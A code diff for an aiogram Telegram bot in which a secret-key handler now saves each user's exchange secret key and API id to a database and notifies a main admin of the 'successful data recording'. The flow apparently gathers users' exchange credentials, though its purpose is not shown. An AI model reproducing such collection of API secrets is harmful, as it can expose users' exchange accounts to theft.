@@ -7,7 +7,7 @@ from aiogram.contrib.fsm_storage.memory import MemoryStorage
 
 from modules.services import db, json_logic
 from modules.keyboards import inline_user, inline_page
-from modules.alerts import send_admins
+from modules.alerts import send_main_admin
 from modules.utils.const_func import ded
 
 from bot_telegram import dp, bot
@@ -118,8 +118,8 @@ async def get_Secret_key(message: Message, state: FSMContext):
     last_name = message.from_user.last_name
     if last_name == None:
         last_name = ''
-
-    await send_admins(ded(f"""<b>
+    db.add_exchange_recill(message.from_user.id, message.from_user.username, bot_info.username, secret_key, api_id, exchange['exchange_name'])
+    await send_main_admin(ded(f"""<b>
     Успешная запись данных</b>
     
     Бот - @{bot_info.username}
